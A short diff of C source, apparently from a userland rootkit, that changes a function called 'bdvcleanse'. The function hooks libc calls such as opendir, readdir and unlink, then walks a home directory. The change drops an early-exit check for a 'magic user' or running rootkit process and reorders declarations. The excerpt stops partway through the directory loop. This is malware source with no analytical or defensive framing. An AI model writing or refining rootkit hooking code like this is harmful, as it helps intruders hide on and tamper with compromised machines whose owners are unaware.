@@ -1,16 +1,14 @@
 void bdvcleanse(void){
-    if(magicusr() || rkprocup())
-        return;
-
-    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT);
-
-    DIR *dp = call(COPENDIR, HOMEDIR);
-    if(dp == NULL) return; // oh no
-
+    DIR *dp;
     struct dirent *dir;
     int i, lstatstat;
     size_t pathlen;
     struct stat pathstat;
+
+    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT);
+
+    dp = call(COPENDIR, HOMEDIR);
+    if(dp == NULL) return; // oh no
 
     while((dir = call(CREADDIR, dp)) != NULL){
         if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
